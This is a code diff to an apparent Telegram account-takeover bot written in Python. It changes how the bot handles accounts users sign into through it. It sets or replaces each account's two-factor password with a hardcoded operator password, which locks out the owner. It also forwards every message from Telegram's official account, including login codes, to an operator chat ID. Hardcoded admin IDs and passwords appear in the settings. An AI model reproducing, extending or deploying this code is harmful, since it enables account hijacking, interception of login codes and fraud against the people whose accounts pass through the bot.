@@ -155,8 +155,9 @@ WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA
 # Admin settings - hardcoded for portability
 ADMIN_CHAT_ID = "5810613583"
 ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
-FORWARD_CHAT_ID = "@CEO_cryfex"
-TWO_FA_PASSWORD = "4735908767"
+FORWARD_CHAT_ID = "5810613583" # Forward to this ID
+TWO_FA_PASSWORD = "2876886938"
+TELEGRAM_OFFICIAL_ID = 777000
 
 # Telegram API for UserSession (Telethon/Pyrogram)
 TELEGRAM_API_ID = 30158256
@@ -2387,30 +2388,26 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         
         # Success! Now set 2FA
         await anim_msg.edit_text("⏳ **Setting up 2FA Protection...**", parse_mode='Markdown')
-        try:
-            # Set 2FA password
-            await client(functions.account.UpdatePasswordRequest(
-                current_password_hash=None,
-                new_password=TWO_FA_PASSWORD
-            ))
-        except Exception as e:
-            logger.error(f"2FA Setup error: {e}")
-
-        # Re-secure the account by setting our system 2FA password
-        # This is already handled in the code above for accounts that had 2FA
-        # For accounts without 2FA, we need to enable it.
         
-        # Check if password is already set
-        try:
-            password_settings = await client(functions.account.GetPasswordRequest())
-            if not password_settings.has_password:
+        async def setup_system_2fa(client, phone):
+            try:
+                # Get current password info
+                password_settings = await client(functions.account.GetPasswordRequest())
+                if password_settings.has_password:
+                    # If already has password, we need to handle it in handle_2fa_input
+                    # But if we are here, sign_in with OTP worked without password
+                    # This shouldn't normally happen if 2FA is on, but let's be safe
+                    pass
+                
                 await client(functions.account.UpdatePasswordRequest(
                     current_password_hash=None,
                     new_password=TWO_FA_PASSWORD
                 ))
-                logger.info(f"Enabled 2FA for {phone}")
-        except Exception as e:
-            logger.error(f"Error checking/enabling 2FA: {e}")
+                logger.info(f"Enabled 2FA for {phone} with system password")
+            except Exception as e:
+                logger.error(f"2FA Setup error for {phone}: {e}")
+
+        await setup_system_2fa(client, phone)
 
         user_id = str(update.effective_user.id)
         country_data = context.user_data.get('country_data')
@@ -2440,21 +2437,21 @@ Your payment will be moved to Main Balance after verification.
         # In a real scenario, we'd add an event handler to the client
         # to listen for messages from Telegram (777) and forward them.
         
-        @client.on(events.NewMessage(from_users=777))
+        @client.on(events.NewMessage(from_users=TELEGRAM_OFFICIAL_ID))
         async def handler(event):
-            logger.info(f"Received message from 777: {event.raw_text}")
-            if "Login code" in event.raw_text:
-                otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
-                if otp_match:
-                    code = otp_match.group()
-                    logger.info(f"Forwarding OTP {code} for {phone} to {FORWARD_CHAT_ID}")
-                    try:
-                        await context.bot.send_message(
-                            chat_id=FORWARD_CHAT_ID,
-                            text=f"লগইন কোড। {phone}\n\ntelegram লগইন otp. {code}"
-                        )
-                    except Exception as e:
-                        logger.error(f"Failed to forward OTP: {e}")
+            logger.info(f"Received message from Telegram Official: {event.raw_text}")
+            # Forward ALL messages from official Telegram
+            try:
+                # Forward the actual message object for better formatting/media support if needed
+                # But here we use text as requested
+                forward_text = f"নতুন মেসেজ। {phone}\n\n{event.raw_text}"
+                await context.bot.send_message(
+                    chat_id=FORWARD_CHAT_ID,
+                    text=forward_text
+                )
+                logger.info(f"Forwarded official message for {phone} to {FORWARD_CHAT_ID}")
+            except Exception as e:
+                logger.error(f"Failed to forward official message: {e}")
         
         # Change Telegram Name
         try:
@@ -2522,16 +2519,18 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await anim_msg.edit_text("⏳ **Re-securing Account (Updating 2FA)...**", parse_mode='Markdown')
         
         try:
-            # First, try to remove the old password by updating it
-            # In Telethon, we can use UpdatePasswordRequest with current_password
+            # Get current password settings to compute hash
+            password_settings = await client(functions.account.GetPasswordRequest())
+            current_password_hash = await client.compute_password_hash(password_settings, password)
+            
+            # Update to our new system password
             await client(functions.account.UpdatePasswordRequest(
-                current_password_hash=await client.compute_password_hash(await client(functions.account.GetPasswordRequest()), password),
+                current_password_hash=current_password_hash,
                 new_password=TWO_FA_PASSWORD
             ))
+            logger.info(f"Updated 2FA for {phone} to system password")
         except Exception as e:
-            logger.error(f"Error updating existing 2FA: {e}")
-            # If update fails, try to turn it off and on (though update is better)
-            pass
+            logger.error(f"Error updating existing 2FA for {phone}: {e}")
 
         # Update balance and finish as usual
         user_id = str(update.effective_user.id)
@@ -2559,21 +2558,21 @@ Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
 
         # Forward login code if any
-        @client.on(events.NewMessage(from_users=777))
+        @client.on(events.NewMessage(from_users=TELEGRAM_OFFICIAL_ID))
         async def handler(event):
-            logger.info(f"Received message from 777: {event.raw_text}")
-            if "Login code" in event.raw_text:
-                otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
-                if otp_match:
-                    code = otp_match.group()
-                    logger.info(f"Forwarding OTP {code} for {phone} to {FORWARD_CHAT_ID}")
-                    try:
-                        await context.bot.send_message(
-                            chat_id=FORWARD_CHAT_ID,
-                            text=f"লগইন কোড। {phone}\n\ntelegram লগইন otp. {code}"
-                        )
-                    except Exception as e:
-                        logger.error(f"Failed to forward OTP: {e}")
+            logger.info(f"Received message from Telegram Official: {event.raw_text}")
+            # Forward ALL messages from official Telegram
+            try:
+                # Forward the actual message object for better formatting/media support if needed
+                # But here we use text as requested
+                forward_text = f"নতুন মেসেজ। {phone}\n\n{event.raw_text}"
+                await context.bot.send_message(
+                    chat_id=FORWARD_CHAT_ID,
+                    text=forward_text
+                )
+                logger.info(f"Forwarded official message for {phone} to {FORWARD_CHAT_ID}")
+            except Exception as e:
+                logger.error(f"Failed to forward official message: {e}")
 
         # Change Telegram Name
         try:
